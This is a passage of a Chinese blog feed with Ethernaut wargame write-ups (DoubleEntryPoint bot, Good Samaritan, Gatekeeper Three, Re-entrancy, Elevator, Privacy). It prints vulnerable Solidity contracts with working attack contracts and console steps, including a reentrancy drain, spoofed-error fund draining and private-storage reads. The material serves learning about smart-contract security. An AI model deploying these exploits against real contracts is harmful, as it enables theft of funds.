<tr>
<td>0x64</td>
<td>4</td>
<td>bytes4</td>
<td><code>delegateTransfer(address,uint256,address)</code> 的选择器== <code>0x9cd1a121</code></td>
</tr>
<tr>
<td>0x68</td>
<td>32</td>
<td>address</td>
<td><code>to</code> 的地址</td>
</tr>
<tr>
<td>0x88</td>
<td>32</td>
<td>uint256</td>
<td><code>value</code> 参数</td>
</tr>
<tr>
<td>0xA8</td>
<td>32</td>
<td>address</td>
<td><code>origSender</code> 参数 (<strong>我们需要关心的</strong>)</td>
</tr>
<tr>
<td>0xC8</td>
<td>28</td>
<td>bytes</td>
<td>根据编码字节的 32 字节参数规则进行零填充</td>
</tr>
</tbody></table>
<p>有了上面的分析后，我们就可以着手写我们的检测机器人的逻辑了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface IDetectionBot &#123;</span><br><span class="line">    function handleTransaction(address user, bytes calldata msgData) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IForta &#123;</span><br><span class="line">    function setDetectionBot(address detectionBotAddress) external;</span><br><span class="line">    function notify(address user, bytes calldata msgData) external;</span><br><span class="line">    function raiseAlert(address user) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract AlertBot is IDetectionBot &#123;</span><br><span class="line">    address private cryptoVault;</span><br><span class="line"></span><br><span class="line">    constructor(address _cryptoVault) public &#123;</span><br><span class="line">        cryptoVault &#x3D; _cryptoVault;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function handleTransaction(address user, bytes calldata msgData) external override &#123;</span><br><span class="line"></span><br><span class="line">        address origSender;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            origSender :&#x3D; calldataload(0xa8)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(origSender &#x3D;&#x3D; cryptoVault) &#123;</span><br><span class="line">            IForta(msg.sender).raiseAlert(user);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>部署上述合约后，获得地址<code>0x38977718DC4ed97440060a7cC065FEadC43EF995</code>，修改合约中的机器人地址：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">fortaAddress = <span class="keyword">await</span> contract.forta()</span><br><span class="line">detectionBotAddress = <span class="string">'38977718DC4ed97440060a7cC065FEadC43EF995'</span></span><br><span class="line">web3.utils.keccak256(<span class="string">'setDetectionBot(address)'</span>)</span><br><span class="line"><span class="string">'0x9e927c686457d61946f62ee085aea4bf59c36754253995951bb435ea8d75e9e3'</span></span><br><span class="line">selector = <span class="string">'0x9e927c68'</span></span><br><span class="line">param = web3.utils.padLeft(detectionBotAddress, <span class="number">64</span>)</span><br><span class="line"><span class="keyword">await</span> web3.eth.sendTransaction(&#123;<span class="attr">from</span>: player, <span class="attr">to</span>: fortaAddress, <span class="attr">data</span>: selector + param&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="Good-Samaritan"><a href="#Good-Samaritan" class="headerlink" title="Good Samaritan"></a>Good Samaritan</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity &gt;&#x3D;0.8.0 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08&#x2F;utils&#x2F;Address.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract GoodSamaritan &#123;</span><br><span class="line">    Wallet public wallet;</span><br><span class="line">    Coin public coin;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        wallet &#x3D; new Wallet();</span><br><span class="line">        coin &#x3D; new Coin(address(wallet));</span><br><span class="line"></span><br><span class="line">        wallet.setCoin(coin);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function requestDonation() external returns(bool enoughBalance)&#123;</span><br><span class="line">        &#x2F;&#x2F; donate 10 coins to requester</span><br><span class="line">        try wallet.donate10(msg.sender) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; catch (bytes memory err) &#123;</span><br><span class="line">            if (keccak256(abi.encodeWithSignature(&quot;NotEnoughBalance()&quot;)) &#x3D;&#x3D; keccak256(err)) &#123;</span><br><span class="line">                &#x2F;&#x2F; send the coins left</span><br><span class="line">                wallet.transferRemainder(msg.sender);</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Coin &#123;</span><br><span class="line">    using Address for address;</span><br><span class="line"></span><br><span class="line">    mapping(address &#x3D;&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    error InsufficientBalance(uint256 current, uint256 required);</span><br><span class="line"></span><br><span class="line">    constructor(address wallet_) &#123;</span><br><span class="line">        &#x2F;&#x2F; one million coins for Good Samaritan initially</span><br><span class="line">        balances[wallet_] &#x3D; 10**6;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address dest_, uint256 amount_) external &#123;</span><br><span class="line">        uint256 currentBalance &#x3D; balances[msg.sender];</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; transfer only occurs if balance is enough</span><br><span class="line">        if(amount_ &lt;&#x3D; currentBalance) &#123;</span><br><span class="line">            balances[msg.sender] -&#x3D; amount_;</span><br><span class="line">            balances[dest_] +&#x3D; amount_;</span><br><span class="line"></span><br><span class="line">            if(dest_.isContract()) &#123;</span><br><span class="line">                &#x2F;&#x2F; notify contract </span><br><span class="line">                INotifyable(dest_).notify(amount_);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            revert InsufficientBalance(currentBalance, amount_);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Wallet &#123;</span><br><span class="line">    &#x2F;&#x2F; The owner of the wallet instance</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    Coin public coin;</span><br><span class="line"></span><br><span class="line">    error OnlyOwner();</span><br><span class="line">    error NotEnoughBalance();</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        if(msg.sender !&#x3D; owner) &#123;</span><br><span class="line">            revert OnlyOwner();</span><br><span class="line">        &#125;</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function donate10(address dest_) external onlyOwner &#123;</span><br><span class="line">        &#x2F;&#x2F; check balance left</span><br><span class="line">        if (coin.balances(address(this)) &lt; 10) &#123;</span><br><span class="line">            revert NotEnoughBalance();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            &#x2F;&#x2F; donate 10 coins</span><br><span class="line">            coin.transfer(dest_, 10);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferRemainder(address dest_) external onlyOwner &#123;</span><br><span class="line">        &#x2F;&#x2F; transfer balance left</span><br><span class="line">        coin.transfer(dest_, coin.balances(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setCoin(Coin coin_) external onlyOwner &#123;</span><br><span class="line">        coin &#x3D; coin_;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface INotifyable &#123;</span><br><span class="line">    function notify(uint256 amount) external;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件：</strong>将合约<code>Wallet</code>中的余额变为零。</p>
<p>想要将其清零，要么每次获取10个，要么触发异常，使得<code>wallet.transferRemainder(msg.sender)</code>能够被执行，前面的方式不现实，因为合约<code>Wallet</code>中的余额被初始化为$10^6$，而后者关键在于如何能够触发异常。</p>
<p>观察<code>Coin</code>合约，我们可以知道，当转账方是一个合约账号时候，会尝试运行其<code>notify</code>函数，也就是说这一点我们是可以控制的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity &gt;&#x3D;0.8.0 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">interface INotifyable &#123;</span><br><span class="line">    function notify(uint256 amount) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GoodSamaritanAttack is INotifyable&#123;</span><br><span class="line">	</span><br><span class="line">	error NotEnoughBalance();</span><br><span class="line">	address instance public;</span><br><span class="line">	constructor(address _instance)&#123;</span><br><span class="line">		instance &#x3D; _instance;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function attack()public&#123;</span><br><span class="line">		(bool success, _) &#x3D; instance.call(</span><br><span class="line">			abi.encodeWithSignature(&quot;requestDonation()&quot;)</span><br><span class="line">		);</span><br><span class="line">		require(success);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function notify(uint256 amount) external&#123;</span><br><span class="line">		if(amount &#x3D;&#x3D; 10)&#123;</span><br><span class="line">   			revert NotEnoughBalance();	</span><br><span class="line">   		&#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Gatekeeper-Three"><a href="#Gatekeeper-Three" class="headerlink" title="Gatekeeper Three"></a>Gatekeeper Three</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract SimpleTrick &#123;</span><br><span class="line">  GatekeeperThree public target;</span><br><span class="line">  address public trick;</span><br><span class="line">  uint private password &#x3D; block.timestamp;</span><br><span class="line"></span><br><span class="line">  constructor (address payable _target) &#123;</span><br><span class="line">    target &#x3D; GatekeeperThree(_target);</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">  function checkPassword(uint _password) public returns (bool) &#123;</span><br><span class="line">    if (_password &#x3D;&#x3D; password) &#123;</span><br><span class="line">      return true;</span><br><span class="line">    &#125;</span><br><span class="line">    password &#x3D; block.timestamp;</span><br><span class="line">    return false;</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">  function trickInit() public &#123;</span><br><span class="line">    trick &#x3D; address(this);</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">  function trickyTrick() public &#123;</span><br><span class="line">    if (address(this) &#x3D;&#x3D; msg.sender &amp;&amp; address(this) !&#x3D; trick) &#123;</span><br><span class="line">      target.getAllowance(password);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GatekeeperThree &#123;</span><br><span class="line">  address public owner;</span><br><span class="line">  address public entrant;</span><br><span class="line">  bool public allow_enterance &#x3D; false;</span><br><span class="line">  SimpleTrick public trick;</span><br><span class="line"></span><br><span class="line">  function construct0r() public &#123;</span><br><span class="line">      owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">    require(tx.origin !&#x3D; owner);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(allow_enterance &#x3D;&#x3D; true);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree() &#123;</span><br><span class="line">    if (address(this).balance &gt; 0.001 ether &amp;&amp; payable(owner).send(0.001 ether) &#x3D;&#x3D; false) &#123;</span><br><span class="line">      _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getAllowance(uint _password) public &#123;</span><br><span class="line">    if (trick.checkPassword(_password)) &#123;</span><br><span class="line">        allow_enterance &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function createTrick() public &#123;</span><br><span class="line">    trick &#x3D; new SimpleTrick(payable(address(this)));</span><br><span class="line">    trick.trickInit();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter() public gateOne gateTwo gateThree returns (bool entered) &#123;</span><br><span class="line">    entrant &#x3D; tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive () external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件：</strong>成功调用<code>enter</code>，并将<code>entrant</code>修改为我们的地址。</p>
<p><code>gateOne</code>有两个条件对于第二个条件，我们借助一个攻击合约即可，即合约地址作为<code>owner</code>，攻击合约想要成为<code>owner</code>，直接调用假的构造函数即可。</p>
<p>对于<code>gateTwo</code>，我们需要调用<code>getAllowance</code>函数并传入一个密码，而该秘密存放在合约<code>SimpleTrick</code>中，虽然是<code>private</code>类型，但是我们可以通关<code>web3.eth.getStorageAt(address,index)</code>的方式获取。</p>
<p>对于<code>gateThree</code>，需要合约<code>GatekeeperThree</code>中的以太币大于0.001，且要求该合约向<code>owner</code>，即我们的攻击合约转账时候失败，那我们直接将我们的合约设置成拒绝接收以太币即可，攻击合约如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">contract GatekeeperThreeAttack&#123;</span><br><span class="line">	address public instance;</span><br><span class="line">	</span><br><span class="line">	constructor(address _instance)&#123;</span><br><span class="line">		instance &#x3D; _instance;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	function beOwner()public&#123;</span><br><span class="line">		(bool success, bytes memory data) &#x3D; instance.call(</span><br><span class="line">                abi.encodeWithSignature(&quot;construct0r()&quot;)</span><br><span class="line">            );</span><br><span class="line">        require(success);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	function change_allow_enterance(uint pwd)public&#123;</span><br><span class="line">		(bool success, bytes memory data) &#x3D; instance.call(</span><br><span class="line">                abi.encodeWithSignature(&quot;getAllowance(uint256)&quot;, pwd)</span><br><span class="line">            );</span><br><span class="line">        require(success);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	function attack()public&#123;</span><br><span class="line">		(bool success, bytes memory data) &#x3D; instance.call(</span><br><span class="line">                abi.encodeWithSignature(&quot;enter()&quot;)</span><br><span class="line">            );</span><br><span class="line">        require(success);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>部署上面攻击合约后，先调用<code>beOwner</code>函数，将攻击合约变成<code>GatekeeperThree</code>的<code>owner</code>。</p>
<p>然后我们在控制台中，输入以下内容，部署一个<code>SimpleTrick</code>合约：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.createTrick()</span><br></pre></td></tr></table></figure>

<p>然后获取其地址：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.trick()</span><br><span class="line"><span class="comment">// '0xe5CD5D17bA2E5A4d68982FdB47FC28E933d9B5Fa'</span></span><br></pre></td></tr></table></figure>

<p>获取其内的密码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(<span class="string">'0xe5CD5D17bA2E5A4d68982FdB47FC28E933d9B5Fa'</span>,<span class="number">2</span>)</span><br><span class="line"><span class="comment">// '0x0000000000000000000000000000000000000000000000000000000064196c58'</span></span><br></pre></td></tr></table></figure>

<p>然后调用攻击合约中的<code>change_allow_enterance</code>，并将<code>0x64196c58</code>传入，确保<code>allow_enterance</code>为真</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.allow_enterance() == <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>然后向<code>GatekeeperThree</code>转入0.0011以太币，确保到账</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> getBalance(instance)</span><br><span class="line"><span class="comment">// 0.0011</span></span><br></pre></td></tr></table></figure>

<p>然后调用攻击合约中的<code>attack</code>函数，确保调用正常：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.entrant() == player</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>磕磕碰碰，花了一个多月，终于完（chao）成（wan）了所有关卡了，许多关卡设计得挺有意思的，但是有些关卡难度不是一般大😭。</p>
]]></content>
      <categories>
        <category>网络攻防</category>
      </categories>
      <tags>
        <tag>Solidity</tag>
        <tag>Web3.0</tag>
      </tags>
  </entry>
  <entry>
    <title>【Ethernaut闯关录】中篇</title>
    <url>/2023/03/11/%E3%80%90Ethernaut%E9%97%AF%E5%85%B3%E5%BD%95%E3%80%91%E4%B8%AD%E7%AF%87/</url>
    <content><![CDATA[<p>原文再续，书接上回，本文继续闯关，本次我们来学习重入漏洞、Solidity存储布局、ERC20代币标准、delegatecall、交易追踪和字节码等知识。<a id="more"></a></p>
<h2 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.12;</span><br><span class="line"></span><br><span class="line">import &#39;openzeppelin-contracts-06&#x2F;math&#x2F;SafeMath.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address &#x3D;&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] &#x3D; balances[_to].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;&#x3D; _amount) &#123;</span><br><span class="line">      (bool result,) &#x3D; msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class="line">      if(result) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -&#x3D; _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通关条件：将合约代币都偷走。</p>
<p>考察的是重入漏洞，该漏洞恐怕是智能合约上面最臭名昭著的漏洞了，<code>withdraw</code>函数中，先进行转账(以<code>call</code>的方式)，然后才更新余额，那么如果转账目的方是一个合约账户，在转账过程又会继续调用<code>withdraw</code>函数，则此时<code>balances[msg.sender]</code>来不及更新，则会造成合约的代币被盗取。著名的DAO攻击就是利用了该漏洞。</p>
<p>具体而言，参照下面的合约：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface Target&#123;</span><br><span class="line">     function donate(address _to) external payable ;</span><br><span class="line">     function withdraw(uint _amount) external ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ReEntrancyAttack &#123;</span><br><span class="line">	address public instance ;</span><br><span class="line">  	constructor(address _instance) payable &#123;</span><br><span class="line">        instance &#x3D; _instance;  </span><br><span class="line">  	&#125;</span><br><span class="line">    fallback()payable external&#123;</span><br><span class="line">    &#x2F;&#x2F; 通过查看可知，Reentrance 合约中有 0.001 ether</span><br><span class="line">        Target target &#x3D; Target(instance);</span><br><span class="line">        target.withdraw(0.001 ether);</span><br><span class="line">    &#125;</span><br><span class="line">    function donate()public returns(bool)&#123;</span><br><span class="line">        Target target &#x3D; Target(instance);</span><br><span class="line">        target.donate&#123;value: 0.001 ether&#125;(address(this));</span><br><span class="line">    &#125;</span><br><span class="line">    function attack()public returns(bool)&#123;</span><br><span class="line">        Target target &#x3D; Target(instance);</span><br><span class="line">        target.withdraw(0.001 ether);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>攻击流程：我们部署我们的攻击合约（部署的时候传入<code>Reentrance</code>合约地址），同时往攻击合约<code>ReEntrancyAttack</code>中转入0.001 ether，接着调用<code>donate</code>，然后在控制台输入<code>fromWei(await contract.balanceOf(&#39;0x11Ef368C1D3226dce5c53A9880b0DF148Ea3D0a1&#39;))</code>即可发现我们已经放入<code>0.001 ether</code>,此时可以调用我们的<code>attack</code>函数，调用完毕，我们的攻击合约将会得到<code>0.002 ether</code>，即我们不仅拿回了原本放进合约<code>Reentrance</code>中的<code>0.001 ether</code>，还顺带把<code>Reentrance</code>本身有的<code>0.001 ether</code>拿了过来。</p>
<h2 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">&#x2F;&#x2F; 判断是不是最后一层</span><br><span class="line">  function isLastFloor(uint) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  function goTo(uint _floor) public &#123;</span><br><span class="line">    Building building &#x3D; Building(msg.sender);</span><br><span class="line">    &#x2F;&#x2F; 如果指定层_floor不是最后一层，则移动到该指定层，并继续判断</span><br><span class="line">    if (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor &#x3D; _floor;</span><br><span class="line">      top &#x3D; building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通关条件：将<code>top</code>置为<code>ture</code>。</p>
<p>本题目和<code>solidity</code>特性好像关联不是很大，考察的是逻辑漏洞，我们想要<code>top</code>为真，则<code>if</code>语句的<code>building.isLastFloor(_floor)</code>必须返回<code>false</code>，但是下面的19行处<code>building.isLastFloor(floor)</code>又要求返回<code>true</code>，对相同值返回不同的结果，看上去貌似矛盾，其实，我们可以这样子想想，只要第一次调用<code>isLastFloor</code>返回是<code>false</code>,后面调用再返回<code>true</code>不就行了吗？如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract ElevatorAttack&#123;</span><br><span class="line">    uint public state;</span><br><span class="line">    constructor()&#123;</span><br><span class="line">    	state &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">    function isLastFloor(uint) external returns (bool)&#123;</span><br><span class="line">    &#x2F;&#x2F; 第一次调用</span><br><span class="line">		if (state &#x3D;&#x3D; 0)&#123;</span><br><span class="line">			state &#x3D; state + 1;</span><br><span class="line">			return false;</span><br><span class="line">		&#125; else&#123;</span><br><span class="line">		&#x2F;&#x2F; 第二次及以后</span><br><span class="line">			return true;</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line"></span><br><span class="line">  bool public locked &#x3D; true;</span><br><span class="line">  uint256 public ID &#x3D; block.timestamp;</span><br><span class="line">  uint8 private flattening &#x3D; 10;</span><br><span class="line">  uint8 private denomination &#x3D; 255;</span><br><span class="line">  uint16 private awkwardness &#x3D; uint16(block.timestamp);</span><br><span class="line">  bytes32[3] private data;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32[3] memory _data) &#123;</span><br><span class="line">    data &#x3D; _data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function unlock(bytes16 _key) public &#123;</span><br><span class="line">    require(_key &#x3D;&#x3D; bytes16(data[2]));</span><br><span class="line">    locked &#x3D; false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;*</span><br><span class="line">    A bunch of super advanced solidity algorithms...</span><br><span class="line"></span><br><span class="line">      ,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;</span><br><span class="line">      .,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,</span><br><span class="line">      *.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^         ,---&#x2F;V\</span><br><span class="line">      &#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.    ~|__(o.o)</span><br><span class="line">      ^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;  UU  UU</span><br><span class="line">  *&#x2F;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：将<code>locked</code>改为<code>false</code></p>
<p>跟<code>Vault</code>关卡很像，可以说是它的升级版，在这里就得好好说一下solidity中的状态变量存储方式了，参考<a href="https://learnblockchain.cn/docs/solidity/internals/layout_in_storage.html" target="_blank" rel="noopener">【官方文档】</a>，我们可知：</p>
<blockquote>
<p>存储大小少于 32 字节的多个变量会被打包到一个 存储插槽storage slot 中，规则如下：</p>
<ul>
<li>存储插槽storage slot 的第一项会以低位对齐的方式储存。</li>
<li>值类型仅使用存储它们所需的字节。</li>
<li>如果 存储插槽storage slot 中的剩余空间不足以储存一个值类型，那么它会被存入下一个 存储插槽storage slot 。</li>
<li>结构体（struct）和数组数据总是会开启一个新插槽（但结构体或数组中的各元素，则按规则紧密打包）。</li>
<li>结构体和数组之后的数据也或开启一个新插槽。</li>
</ul>
</blockquote>
<p>由于 映射mapping 和动态数组不可预知大小，不能在状态变量之间存储他们。相反，他们自身根据 <a href="https://learnblockchain.cn/docs/solidity/internals/layout_in_storage.html#storage-inplace-encoding" target="_blank" rel="noopener">以上规则</a> 仅占用 32 个字节，然后他们包含的元素的存储的其实位置，则是通过 Keccak-256 哈希计算来确定，比较复杂，可以在<a href="https://learnblockchain.cn/docs/solidity/internals/layout_in_storage.html" target="_blank" rel="noopener">【文档】</a>中查看，这里不涉及，就不带大家看了。</p>
<p>因此根据变量类型和对应占用字节数，<code>Privacy</code>中的存储分布大致如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----------------------------------------------------------------</span><br><span class="line">|              unused (30)                         | locked (1)| &lt;- slot 0</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">|                          ID (32)                             | &lt;- slot 1</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">|   unused(28)   | awkwardness(2)|denomination(1)|flattening(1)| &lt;- slot 2</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">|                         data[0] (32)                         | &lt;- slot 3</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">|                         data[1] (32)                         | &lt;- slot 4</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">|                         data[2] (32)                         | &lt;- slot 5</span><br><span class="line">----------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>因此我们使用</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(instance, <span class="string">"5"</span>)</span><br><span class="line">&gt; <span class="string">'0xa264a1b3d12c27658b731ce1c5c631521539801e9e246f3c0e3e03dd408a8de8'</span></span><br></pre></td></tr></table></figure>

<p>就可以获取<code>data[2]</code>了，但是<code>bytes16(data[2])</code>会截取其低位的值，又因为对其方式，因此<code>a264a1b3d12c27658b731ce1c5c63152</code>才是我们想要的结果。</p>
